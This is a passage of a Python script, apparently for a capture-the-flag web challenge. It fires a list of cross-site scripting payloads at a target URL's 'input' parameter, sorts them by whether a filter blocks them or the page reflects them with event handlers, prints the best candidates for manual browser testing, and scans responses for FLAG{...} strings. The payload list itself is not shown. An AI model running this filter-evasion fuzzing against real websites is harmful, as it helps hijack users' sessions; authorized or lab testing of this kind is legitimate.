print(f"Total payloads to test: {len(payloads)}")
print("=" * 80)

# Test each payload
for idx, payload_data in enumerate(payloads, 1):
    payload = payload_data["payload"]
    name = payload_data["name"]
    encoding = payload_data["encoding"]
    
    print(f"\n[{idx}/{len(payloads)}] Testing: {name}")
    print(f"[Encoding: {encoding}]")
    print(f"[Payload: {payload}]")
    
    try:
        # Send the payload as a query parameter
        params = {'input': payload}
        response = requests.get(target_url, params=params, timeout=10)
        
        status_code = response.status_code
        response_text = response.text
        content_length = len(response.content)
        
        print(f"[Status: {status_code}] [Length: {content_length}B]")
        
        # Check for blocking indicators
        blocked_keywords = ['blocked', 'filter', 'denied', 'malicious', 'error', '403', 'not allowed']
        filter_triggered = any(keyword in response_text.lower() for keyword in blocked_keywords)
        
        # Check if payload is reflected in response
        # For URL encoded payloads, check both encoded and decoded versions
        if encoding == 'url' or encoding in ['url_mixed', 'url_double']:
            # Check decoded version too
            decoded_payload = urllib.parse.unquote(payload)
            is_reflected = decoded_payload in response_text or payload in response_text
        else:
            is_reflected = payload in response_text
        
        # Check for common filter errors
        filter_error = None
        if 'script' in response_text.lower() and 'blocked' in response_text.lower():
            filter_error = "script keyword blocked"
        elif 'onerror' in response_text.lower() and 'blocked' in response_text.lower():
            filter_error = "onerror keyword blocked"
        elif 'onload' in response_text.lower() and 'blocked' in response_text.lower():
            filter_error = "onload keyword blocked"
        
        result_status = ""
        
        if filter_error:
            result_status = "BLOCKED"
            blocked_count += 1
            print(f"[!] BLOCKED: {filter_error}")
        elif is_reflected:
            # Check if reflected in a way that might execute
            # Look for unescaped HTML tags in response
            if re.search(r'<[^>]+on\w+[^>]*>', response_text, re.IGNORECASE):
                result_status = "REFLECTED (POTENTIALLY_EXECUTABLE)"
                potential_execution_count += 1
                print(f"[+] REFLECTED with event handlers - POTENTIALLY EXECUTABLE")
            elif '<' in response_text and '>' in response_text:
                result_status = "REFLECTED (HTML_TAGS_FOUND)"
                reflected_count += 1
                print(f"[+] REFLECTED: HTML tags present in response")
            else:
                result_status = "REFLECTED (ENCODED/SANITIZED)"
                reflected_count += 1
                print(f"[+] REFLECTED but may be sanitized")
        else:
            result_status = "NOT_REFLECTED"
            print(f"[-] Not reflected in response")
        
        # Store detailed result
        result_data = {
            "name": name,
            "payload": payload,
            "encoding": encoding,
            "status_code": status_code,
            "filter_triggered": filter_triggered,
            "is_reflected": is_reflected,
            "filter_error": filter_error,
            "status": result_status,
            "content_length": content_length
        }
        results.append(result_data)
        
        # Show response snippet if reflected
        if is_reflected:
            # Find where payload appears
            snippet_start = max(0, response_text.find(payload) - 100)
            snippet_end = min(len(response_text), response_text.find(payload) + len(payload) + 100)
            snippet = response_text[snippet_start:snippet_end]
            print(f"[Response snippet:]\n{snippet}")
        
    except Exception as e:
        print(f"[!] ERROR: {str(e)}")
        results.append({
            "name": name,
            "payload": payload,
            "encoding": encoding,
            "error": str(e),
            "status": "ERROR"
        })

# Summary
print("\n" + "=" * 80)
print("TEST SUMMARY")
print("=" * 80)
print(f"Total payloads tested: {len(payloads)}")
print(f"Blocked by filter: {blocked_count}")
print(f"Reflected: {reflected_count}")
print(f"Potentially executable: {potential_execution_count}")

# Find most promising payloads
print("\n" + "=" * 80)
print("MOST PROMISING PAYLOADS FOR MANUAL VERIFICATION")
print("=" * 80)

executable_payloads = [r for r in results if "POTENTIALLY_EXECUTABLE" in r.get("status", "")]
reflected_payloads = [r for r in results if "REFLECTED" in r.get("status", "") and r not in executable_payloads]

if executable_payloads:
    print("\n[!!] HIGH PRIORITY - Potentially Executable:")
    for i, result in enumerate(executable_payloads[:5], 1):
        print(f"\n{i}. Name: {result['name']}")
        print(f"   Encoding: {result['encoding']}")
        print(f"   Payload: {result['payload']}")
        print(f"   Status: {result['status']}")
        print(f"   Test URL: {target_url}?input={urllib.parse.quote(result['payload'])}")

if reflected_payloads:
    print("\n[+] Medium Priority - Reflected with HTML:")
    for i, result in enumerate(reflected_payloads[:5], 1):
        print(f"\n{i}. Name: {result['name']}")
        print(f"   Encoding: {result['encoding']}")
        print(f"   Payload: {result['payload']}")
        print(f"   Status: {result['status']}")
        print(f"   Test URL: {target_url}?input={urllib.parse.quote(result['payload'])}")

# Save detailed results to JSON for further analysis
print("\n" + "=" * 80)
print("DETAILED RESULTS EXPORT")
print("=" * 80)
print(json.dumps(results[:10], indent=2))  # Show first 10 results

# Overall assessment
print("\n" + "=" * 80)
print("ASSESSMENT")
print("=" * 80)

if potential_execution_count > 0:
    print(f"[SUCCESS] Found {potential_execution_count} potentially executable payloads!")
    print("These should be tested manually in a browser to confirm execution.")
    best_payload = executable_payloads[0]
    print(f"\nBest candidate: {best_payload['name']}")
    print(f"Payload: {best_payload['payload']}")
    print(f"Test with: {target_url}?input={urllib.parse.quote(best_payload['payload'])}")
elif reflected_count > 0:
    print(f"[PARTIAL] Found {reflected_count} reflected payloads, but may be sanitized.")
    print("Try additional encoding or different event handlers.")
else:
    print("[FAILED] No useful payloads found. All blocked or not reflected.")
    print("Recommend trying: nested encoding, alternate injection points, or different payload structure.")

# Check for flags in all responses
print("\n" + "=" * 80)
print("FLAG SEARCH")
print("=" * 80)

flag_pattern = re.compile(r'FLAG\{[^}]+\}')
all_flags = []

for result in results:
    if 'error' not in result:
        try:
            params = {'input': result['payload']}
            resp = requests.get(target_url, params=params, timeout=5)
            flags = flag_pattern.findall(resp.text)
            if flags:
                all_flags.extend(flags)
                print(f"[!] FLAG found with payload {result['name']}:")
                for flag in flags:
                    print(f"   {flag}")
        except:
            pass

if not all_flags:
    print("No FLAG{...} patterns found in responses.")

print("\n" + "=" * 80)
print("TEST COMPLETE")
print("=" * 80)
